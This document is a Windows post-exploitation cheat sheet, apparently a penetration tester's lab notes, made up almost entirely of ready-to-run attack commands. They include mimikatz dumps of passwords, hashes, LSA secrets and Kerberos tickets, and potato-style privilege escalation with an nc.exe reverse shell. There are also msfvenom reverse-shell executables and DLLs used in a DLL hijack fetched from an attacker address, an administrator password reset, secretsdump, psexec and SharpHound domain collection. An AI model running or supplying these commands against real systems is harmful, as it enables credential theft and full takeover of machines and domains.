# Upon access:

1. Administrator? Yes:

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "lsadump::secrets" "sekurlsa::ekeys" "vault::cred /patch" "sekurlsa::tickets /export" "exit" | Out-file mimikatz-output.txt
```

## SeImpersonatePrivilege

```
whoami /priv
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

[Printspoofer](https://github.com/itm4n/PrintSpoofer/releases)

```
.\printspoofer.exe -i -c powershell.exe
```

If Printspoofer doesn't work,

[GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)

```powershell
.\GodPotato-NET4.exe -cmd "nc.exe -e C:\Windows\System32\cmd.exe 192.168.45.173 4444"
```
\
## SeManageVolumePrivilege

[Info.](https://medium.com/@raphaeltzy13/exploiting-semanagevolumeprivilege-with-dll-hijacking-windows-privilege-escalation-1a4f28372d37)

On Windows:

```
iwr -uri https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe
```

```
.\SeManageVolumeExploit.exe
Entries changed: 918
DONE
```

On linux:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.194 LPORT=1337 -f dll -o tzres.dll
```

Then:

```
iwr -uri http://192.168.45.194/tzres.dll -outfile tzres.dll
```

```
mv tzres.dll C:\Windows\System32\wbem\
```

Then simply open up a netcat listener and run `systeminfo`.

## Interesting Files

```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.zip -File -Recurse -ErrorAction SilentlyContinue
```

## Secretsdump 

change Administrator's password:

```
net user Adminstrator Password123
```

Then use secretsdump:

```
impacket-secretsdump Administrator:Password123@192.168.178.249
```

Always use it with mimikatz!!!!

## Check for interesting directories

Check for directories in `C:\`, `C:\Users\username`, `C:\Users`, `C:\Windows` and so on. 

## Run winpeas

[Winpeas](https://github.com/peass-ng/PEASS-ng/releases/download/20240915-f58aa30b/winPEASx64.exe)

Check for unquoted paths, registry keys

## Environment variables

Might contain interesting entries.

```
dir env:
Get-ChildItem env:
```

## msfconsole for reverse shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=9000 -f exe -o reverse_shell.exe
```

For DLLs I recommend using:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.194 LPORT=5555 -f dll -a x86 --platform windows -e x86/xor_dynamic -b '\x00' -o privesc.dll
```
# Service Check

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

# psexec

```bash
psexec.py Administrator:'Password123'@192.168.175.95
```

# Sharphound

```powershell
Set-ExecutionPolicy RemoteSigned
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain secura.yzx -zipFileName loot.zip
```

